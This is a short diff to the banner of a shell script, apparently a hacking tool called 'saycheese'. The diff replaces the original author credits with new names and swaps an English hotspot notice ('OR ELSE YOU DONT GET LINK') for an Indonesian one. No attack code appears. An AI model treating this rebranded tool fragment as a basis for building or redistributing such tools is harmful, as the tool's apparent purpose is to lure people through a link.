@@ -28,13 +28,12 @@ echo '
 
                                                                                
 echo " "
-printf "      \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
-printf "          \e[1;77m v1.1 This reborn script by { Noob Hackers }\e[0m \n"
+printf "      \e[1;77m v1.0 coded by github.com/MR404cyber\e[0m \n"
+printf "          \e[1;77m v1.1 This reborn script by { MR.404/RAIHAN }\e[0m \n"
 
 printf "\n"
 
-echo "      N073:> PLEASE TURN ON YOUR HOTSPOT 
-                   OR ELSE YOU DONT GET LINK....!"
+echo "      N073:> NYALAKAN HOSTPOT LU "
 
 }
 
